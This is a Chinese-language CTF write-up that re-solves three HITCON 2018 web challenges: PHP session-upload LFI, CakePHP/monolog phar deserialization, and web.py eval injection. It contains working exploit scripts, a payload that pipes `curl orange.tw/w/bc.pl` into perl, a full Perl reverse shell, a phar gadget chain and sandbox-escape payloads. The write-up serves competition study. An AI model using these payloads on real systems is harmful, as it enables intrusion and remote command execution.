---
title: hitcon-复现
abbrlink: 49989
date: 2018-10-23 19:08:03
tags: ctf
---

# Web

## One Line PHP Challenge

```
<?php
	($_=@$_GET['orange']) && @substr(file($_)[0], 0, 6) === "@<?php" ? include($_) : highlight_file(__FILE__);
```

参考链接:

* https://hackmd.io/s/B1A2JIjjm
* https://hackmd.io/s/SkxOwAqiQ

* https://www.anquanke.com/post/id/162656

考点: session.upload + lfi

### include 策略

PHP配置中，`allow_url_include`一般为`Off`，所以RFI不可取。由于最新版本Apache2和PHP的加固，包含`/proc/self/environs`或者`/var/log/apache2/access.log`也行，同时也没有办法泄露PHP上传的文件的`temporary filename`,所以`LFI WITH PHPINFO() ASSISTANCE`无效。

#### session 策略

session.upload: 在ubuntu中，以apt-get安装的php，*session.upload* 会默认开启。

**The PHP check the value `session.auto_start` or function `session_start()` to know whether it need to process session on current request or not. Unfortunately, the default value of `session.auto_start` is `Off`. However, it’s interesting that if you provide the `PHP_SESSION_UPLOAD_PROGRESS` in multipart POST data. The PHP will enable the session for you :P**

PHP会检查`session.auto_start`或者`session_start()`方法来判断是否需要在请求中处理`session`。不幸的是`session.auto_start`的值默认是`off`。但是，有意思的是，当我们在`multipart POST`中提供`PHP_SESSION_UPLOAD_PROGRESS`的时候，PHP将会开启`session`。

测试如下:

```shell
tiandiwuji@tiandiwuji:~$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange'
tiandiwuji@tiandiwuji:~$ sudo ls -al /var/lib/php/sessions/
total 8
drwx-wx-wt 2 root root 4096 Jan 30  2018 .
drwxr-xr-x 4 root root 4096 Oct 23 11:08 ..
tiandiwuji@tiandiwuji:~$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -d 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'
tiandiwuji@tiandiwuji:~$ sudo ls -al /var/lib/php/sessions/
total 8
drwx-wx-wt 2 root root 4096 Jan 30  2018 .
drwxr-xr-x 4 root root 4096 Oct 23 11:08 ..
tiandiwuji@tiandiwuji:~$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'  -F 'file=@/etc/passwd'
tiandiwuji@tiandiwuji:~$ sudo ls -l /var/lib/php/sessions/
total 0
-rw------- 1 www-data www-data 0 Oct 24 03:36 sess_iamorange
```

### cleanup 策略

尽管互联网上大部分文档都建议将`session.upload_progress.cleanup`值设为`Off`方便调试，但是，该值在PHP中默认为`On`，也就是说session中保存的上传进度将会被尽快清理干净。

这里有两个解决方法:

* 条件竞争
* 上传超大的文件，保证短时间内上传进度不被删除

### Prefix（@<?php）解决

### 方法一@orange:

由于`session.upload_progress_prefix`的默认为`upload_progress_`，所以session文件的开头将默认为`upload_progress_`。

为了能够让字符串匹配`@<?php`，可以采用PHP strem filter来绕过前缀检查。

**base64_decode**: 该方法会忽略无效的字符，测试如下:

```shell
php > echo base64_decode("upload_progress_ZZVVVSM0wyTkhhSGRKUjBKcVpGaEtjMGxIT1hsWlZ6VnVXbE0xTUdSNU9UTk1Na3BxVEc1Q2MyWklRbXhqYlhkblRGZEJOMUI2TkhaTWVUaDJUSGs0ZGt4NU9IWk1lVGgy");
hik
޲YUUR3L2NHaHdJR0JqZFhKc0lHOXlZVzVuWlM1MGR5OTNMMkpqTG5Cc2ZIQmxjbXdnTFdBN1B6NHZMeTh2THk4dkx5OHZMeTh2
php > echo base64_decode(base64_decode("upload_progress_ZZVVVSM0wyTkhhSGRKUjBKcVpGaEtjMGxIT1hsWlZ6VnVXbE0xTUdSNU9UTk1Na3BxVEc1Q2MyWklRbXhqYlhkblRGZEJOMUI2TkhaTWVUaDJUSGs0ZGt4NU9IWk1lVGgy"));
)↑QDw/cGhwIGBjdXJsIG9yYW5nZS50dy93L2JjLnBsfHBlcmwgLWA7Pz4vLy8vLy8vLy8vLy8v
php > echo base64_decode(base64_decode(base64_decode("upload_progress_ZZVVVSM0wyTkhhSGRKUjBKcVpGaEtjMGxIT1hsWlZ6VnVXbE0xTUdSNU9UTk1Na3BxVEc1Q2MyWklRbXhqYlhkblRGZEJOMUI2TkhaTWVUaDJUSGs0ZGt4NU9IWk1lVGgy"))); 
@<?php `curl orange.tw/w/bc.pl|perl -`;?>/////////////
@<?php echo `ls -al`;echo "hetaonihao";?>/////////////
```

本地测试:

```
php > echo base64_encode(base64_encode(base64_encode("@<?php echo `ls -al`;?>//")));
VVVSM0wyTkhhSGRKUjFacVlVYzRaMWxIZUhwSlF6Rm9Za2RCTjFCNk5IWk1kejA5
```

最终脚本:

```
import sys
import string
import requests
from base64 import b64encode
from random import sample, randint
from multiprocessing.dummy import Pool as ThreadPool

HOST = 'http://54.250.246.238/'
sess_name = 'iamorange'

headers = {
    'Connection': 'close', 
    'Cookie': 'PHPSESSID=' + sess_name
}

#payload = '@<?php `curl orange.tw/w/bc.pl|perl -`;?>'

#while 1:
#    junk = ''.join(sample(string.ascii_letters, randint(8, 16)))
#    x = b64encode(payload + junk)
#    xx = b64encode(b64encode(payload + junk))
#    xxx = b64encode(b64encode(b64encode(payload + junk)))
#    if '=' not in x and '=' not in xx and '=' not in xxx:
#        payload = xxx
#        print payload
#        break

# 我的修改，不管payload怎么变，长度如果和下边这个payload一样长，那么就不需要在填充字符串了，否则的话，需要在payload后边填充字符串，保证每次b64encode该payload之后，不会出现`=`，如果出现的话，会有问题 
payload = '@<?php echo `ls -al`;echo "hetaonihao";?>/////////////'

payload = b64encode(b64encode(b64encode(payload)))
print payload

def runner1(i):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': 'ZZ' + payload + 'Z'
    }
    while 1:
        fp = open('/etc/passwd', 'rb')
        r = requests.post(HOST, files={'f': fp}, data=data, headers=headers)
        fp.close()

def runner2(i):
    filename = '/var/lib/php/sessions/sess_' + sess_name
    filename = 'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s' % filename
    # print filename
    while 1:
        url = '%s?orange=%s' % (HOST, filename)
        r = requests.get(url, headers=headers)
        c = r.content
        if c and 'orange' not in c:
            print [c]


if sys.argv[1] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)

# 开启两个窗口
# python solve.py 1
# python solve.py 2
```

### 附: orange.tw/w/bc.pl

```
#!/usr/bin/perl
use Socket;
$cmd= "lynx";
$system= 'echo "`uname -a`";echo "`id`";/bin/sh';
$0=$cmd;
$target="orange.tw";
$port=12345;
$iaddr=inet_aton($target) || die("Error: $!\n");
$paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system($system);
close(STDIN);
close(STDOUT);
close(STDERR);
```

## baby cake

### 查看composer.json

```
"php": ">=5.6",
"cakephp/cakephp": "3.5.*",
"cakephp/migrations": "^1.0",
"cakephp/plugin-installer": "^1.0",
"josegonzalez/dotenv": "2.*",
"mobiledetect/mobiledetectlib": "2.*", 
"monolog/monolog": "^1.23"
```

`monolog`版本过低，存在反序列化rce漏洞。

### 漏洞寻找

#### 针对header的序列化以及反序列化

```
private function cache_set($key, $response) {
        $cache_dir = $this->_cache_dir($key);
        if ( !file_exists($cache_dir) ) {
            mkdir($cache_dir, 0700, true);
            file_put_contents($cache_dir . "body.cache", $response->body);
            file_put_contents($cache_dir . "headers.cache", serialize($response->headers));
        }
    }

    private function cache_get($key) {
        $cache_dir = $this->_cache_dir($key);
        if (file_exists($cache_dir)) {
            $body   = file_get_contents($cache_dir . "/body.cache");
            $headers = file_get_contents($cache_dir . "/headers.cache");
            
            $body = "<!-- from cache -->\n" . $body;
            $headers = unserialize($headers);
            return new DymmyResponse($headers, $body);
        } else {
            return null;
        }
    }
```

由于`$headers`变量是一个数组，所以在序列化之后，在反序列化，仍然得到的是一个数组，至于具体内容则不会触发反序列化，因而不存在漏洞。

#### body

```
if ($method == 'get') {
	$response = $this->cache_get($key);
	if (!$response) {
		$response = $this->httpclient($method, $url, $headers, null);
		$this->cache_set($key, $response);                
		}
	} else {
	$response = $this->httpclient($method, $url, $headers, $data);
}
```

查看httpclient方法:

```
private function httpclient($method, $url, $headers, $data) {
        $options = [
            'headers' => $headers, 
            'timeout' => 10
        ];

        $http = new Client();
        return $http->$method($url, $data, $options);
    }
```

跟进Client里边的方法:

```
public function post($url, $data = [], array $options = [])
{
    $options = $this->_mergeOptions($options);
    $url = $this->buildUrl($url, [], $options);
    return $this->_doRequest(Request::METHOD_POST, $url, $data, $options);
    }
```

跟进_doRequest方法:

```
protected function _doRequest($method, $url, $data, $options)
{
    $request = $this->_createRequest(
        $method,
        $url,
        $data,
        $options
    );
    return $this->send($request, $options);
    }
```

_createRequest:

```
protected function _createRequest($method, $url, $data, $options)
    {
        $headers = isset($options['headers']) ? (array)$options['headers'] : [];
        if (isset($options['type'])) {
            $headers = array_merge($headers, $this->_typeHeaders($options['type']));
        }
        if (is_string($data) && !isset($headers['Content-Type']) && !isset($headers['content-type'])) {
            $headers['Content-Type'] = 'application/x-www-form-urlencoded';
        }

 /*重点*/$request = new Request($url, $method, $headers, $data);
        $cookies = isset($options['cookies']) ? $options['cookies'] : [];
        /** @var \Cake\Http\Client\Request $request */
        $request = $this->_cookies->addToRequest($request, $cookies);
        if (isset($options['auth'])) {
            $request = $this->_addAuthentication($request, $options);
        }
        if (isset($options['proxy'])) {
            $request = $this->_addProxy($request, $options);
        }

        return $request;
    }
```

跟进Request类:

```
public function __construct($url = '', $method = self::METHOD_GET, array $headers = [], $data = null)
    {
        $this->validateMethod($method);
        $this->method = $method;
        $this->uri = $this->createUri($url);
        $headers += [
            'Connection' => 'close',
            'User-Agent' => 'CakePHP'
        ];
        $this->addHeaders($headers);
        $this->body($data);
    }
```

跟进body方法:

```
public function body($body = null)
    {
        if ($body === null) {
            $body = $this->getBody();

            return $body ? $body->__toString() : '';
        }
        if (is_array($body)) {
            $formData = new FormData();
            $formData->addMany($body);
            $this->header('Content-Type', $formData->contentType());
            $body = (string)$formData;
        }
        $stream = new Stream('php://memory', 'rw');
        $stream->write($body);
        $this->stream = $stream;

        return $this;
    }
```

如果`$body`是数组的话，

```
$formData->addMany($body);
```

跟进addMany方法:

data来源: `data = $request->getQuery('data');`

```
public function addMany(array $data)
    {
        foreach ($data as $name => $value) {
            $this->add($name, $value);
        }

        return $this;
    }
```

跟进add方法:

```
public function add($name, $value = null)
    {
        if (is_array($value)) {
            $this->addRecursive($name, $value);
        } elseif (is_resource($value)) {
            $this->addFile($name, $value);
        } elseif (is_string($value) && strlen($value) && $value[0] === '@') {
            trigger_error(
                'Using the @ syntax for file uploads is not safe and is deprecated. ' .
                'Instead you should use file handles.',
                E_USER_DEPRECATED
            );
            $this->addFile($name, $value);
        } elseif ($name instanceof FormDataPart && $value === null) {
            $this->_hasComplexPart = true;
            $this->_parts[] = $name;
        } else {
            $this->_parts[] = $this->newPart($name, $value);
        }

        return $this;
    }
```

在该方法中，我们可以看到如果字符串以`@`符号开头的话，那么就会调用`addfile`方法。

```
public function addFile($name, $value)
    {
        $this->_hasFile = true;

        $filename = false;
        $contentType = 'application/octet-stream';
        if (is_resource($value)) {
            $content = stream_get_contents($value);
            if (stream_is_local($value)) {
                $finfo = new finfo(FILEINFO_MIME);
                $metadata = stream_get_meta_data($value);
                $contentType = $finfo->file($metadata['uri']);
                $filename = basename($metadata['uri']);
            }
        } else {
            $finfo = new finfo(FILEINFO_MIME);
            $value = substr($value, 1);
            $filename = basename($value);
            $content = file_get_contents($value);
            $contentType = $finfo->file($value);
        }
        $part = $this->newPart($name, $content);
        $part->type($contentType);
        if ($filename) {
            $part->filename($filename);
        }
        $this->add($part);

        return $part;
    }
```

最终，在`addfile`方法中会调用`$content = file_get_contents($value);`方法。`$value`可控。

构造payload:

![](/assets/hitcon/TIM截图20181025182341.png)

### rce

构造phar文件，通过get请求缓存，保存到 body.cache 中，在通过POST请求 body.cache，通过file_get_contents触发发序列化monolog类，最终rce。

生成phar文件payload:

```
<?php

namespace MonologHandler
{
    class SyslogUdpHandler
    {
        protected $socket;
        function __construct($x)
        {
            $this->socket = $x;
        }
    }
    class BufferHandler
    {
        protected $handler;
        protected $bufferSize = -1;
        protected $buffer;
        # ($record['level'] < $this->level) == false
        protected $level = null;
        protected $initialized = true;
        # ($this->bufferLimit > 0 && $this->bufferSize === $this->bufferLimit) == false
        protected $bufferLimit = -1;
        protected $processors;
        function __construct($methods, $command)
        {
            $this->processors = $methods;
            $this->buffer = [$command];
            $this->handler = clone $this;
        }
    }
}

namespace{
    $cmd = "ls -alt";

    $obj = new MonologHandlerSyslogUdpHandler(
        new MonologHandlerBufferHandler(
            ['current', 'system'],
            [$cmd, 'level' => null]
        )
    );

    $phar = new Phar('exploit.phar');
    $phar->startBuffering();
    $phar->addFromString('test', 'test');
    $phar->setStub('<?php __HALT_COMPILER(); ? >');
    $phar->setMetadata($obj);
    $phar->stopBuffering();
}
```

## On my Raddit V2 

V1是个Crypto，兴趣不大。直接复现V2.

参考链接: https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/

该网站使用web.py框架，根据requirements.txt可以知道版本号是0.38

web.py:

```
# coding: UTF-8
import os
import web
import urllib
import urlparse
from Crypto.Cipher import DES

web.config.debug = False
ENCRPYTION_KEY = 'megnnaro'


urls = (
    '/', 'index'
)
app = web.application(urls, globals())
db = web.database(dbn='sqlite', db='db.db')


def encrypt(s):
    length = DES.block_size - (len(s) % DES.block_size)
    s = s + chr(length)*length

    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
    return cipher.encrypt(s).encode('hex')

def decrypt(s):
    try:
        data = s.decode('hex')
        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)

        data = cipher.decrypt(data)
        data = data[:-ord(data[-1])]
        return dict(urlparse.parse_qsl(data))
    except Exception as e:
        print e.message
        return {}

def get_posts(limit=None):
    records = []
    for i in db.select('posts', limit=limit, order='ups desc'):
        tmp = {
            'm': 'r', 
            't': i.title.encode('utf-8', 'ignore'), 
            'u': i.id, 
        } 
        tmp['param'] = encrypt(urllib.urlencode(tmp))
        tmp['ups'] = i.ups
        if i.file:
            tmp['file'] = encrypt(urllib.urlencode({'m': 'd', 'f': i.file}))
        else:
            tmp['file'] = ''

        records.append( tmp )
    return records

def get_urls():
    urls = []
    for i in [10, 100, 1000]:
        data = {
            'm': 'p', 
            'l': i
        }
        urls.append( encrypt(urllib.urlencode(data)) )
    return urls

class index:
    def GET(self):
        s = web.input().get('s')
        if not s:
            return web.template.frender('templates/index.html')(get_posts(), get_urls())
        else:
            s = decrypt(s)
            method = s.get('m', '')
            if method and method not in list('rdp'):
                return 'param error'
            if method == 'r':
                uid = s.get('u')
                record = db.select('posts', where='id=$id', vars={'id': uid}).first()
                if record:
                    raise web.seeother(record.url)
                else:
                    return 'not found'
            elif method == 'd':
                file = s.get('f')
                if not os.path.exists(file):
                    return 'not found'
                name = os.path.basename(file)
                web.header('Content-Disposition', 'attachment; filename=%s' % name)
                web.header('Content-Type', 'application/pdf')
                with open(file, 'rb') as fp:
                    data = fp.read()
                return data
            elif method == 'p':
                limit = s.get('l')
                return web.template.frender('templates/index.html')(get_posts(limit), get_urls())
            else:
                return web.template.frender('templates/index.html')(get_posts(), get_urls())


if __name__ == "__main__":
    app.run()
```

问题出在Web.py的db部分，可能让用户注入代码。

```
def reparam(string_, dictionary):
    """
    Takes a string and a dictionary and interpolates the string
    using values from the dictionary. Returns an `SQLQuery` for the result.

        >>> reparam("s = $s", dict(s=True))
        <sql: "s = 't'">
        >>> reparam("s IN $s", dict(s=[1, 2]))
        <sql: 's IN (1, 2)'>
    """
    dictionary = dictionary.copy() # eval mucks with it
    vals = []
    result = []
    for live, chunk in _interpolate(string_):
        if live:
            v = eval(chunk, dictionary)
            result.append(sqlquote(v))
        else:
            result.append(chunk)
    return SQLQuery.join(result, '')
```

在web.py中get_posts方法中，db.select 会调用上边的方法。

```
def get_posts(limit=None):
    records = []
    for i in db.select('posts', limit=limit, order='ups desc'):
        tmp = {
            'm': 'r', 
            't': i.title.encode('utf-8', 'ignore'), 
            'u': i.id, 
        } 
        tmp['param'] = encrypt(urllib.urlencode(tmp))
        tmp['ups'] = i.ups
        if i.file:
            tmp['file'] = encrypt(urllib.urlencode({'m': 'd', 'f': i.file}))
        else:
            tmp['file'] = ''

        records.append( tmp )
    return records
```

limit可控，构造payload如下:

```
{'m':'p','l':'$__import__("os").system("ls > /tmp/ls.txt")'}
```

该payload已被修复，但是依然可以绕过:

```
{'m':'p','l':'${(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__=="catch_warnings"][0]()._module.__builtins__):getthem["__import__"]("os").system("ls -al / > /tmp/1.txt"))()}'}
```

然后，下载 1.txt 即可。